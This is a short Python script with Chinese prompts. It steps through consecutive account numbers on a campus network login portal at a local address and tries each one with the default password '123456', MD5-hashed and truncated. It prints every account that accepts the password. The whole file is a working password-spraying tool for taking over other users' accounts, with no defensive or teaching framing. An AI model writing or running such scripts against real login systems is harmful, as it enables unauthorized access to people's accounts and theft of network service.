# -*- coding:UTF-8 -*-
import requests
from bs4 import  BeautifulSoup
from hashlib import md5
def GetCampusAccount(user):
    passwd = '123456'
    m = md5()
    m.update(passwd)
    postdata = {
        'username':user,
        'password':m.hexdigest()[8:24],
        'drop':'0',
        'type':'1',
        'n':'100'
    }
    header = {
        'Content-Type':'application/x-www-form-urlencoded',
        'Referer':'http://10.0.0.55/',
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36'
    }
    login_url = "http://10.0.0.55/cgi-bin/do_login"
    login_r = requests.post(login_url,data=postdata,headers=header)
    return login_r.text

name = input('输入要爬取的起始账号:\n')
name = str(name)
accountrange = input('输入爬取的账号范围(0~300):\n')
if accountrange > 300:
    print('范围过大')
    exit()
usable_account = 0;
for i in range(0,accountrange):
    if (GetCampusAccount(name) != 'username_error' and GetCampusAccount(name) != 'password_error'):
        print('可用帐号')
        print(name)
        usable_account += 1
    name_int = int(name)
    name_int = name_int + 1
    name_str = str(name_int)
    name = name_str.encode()
if usable_account == 0:
    print('无可用账号')
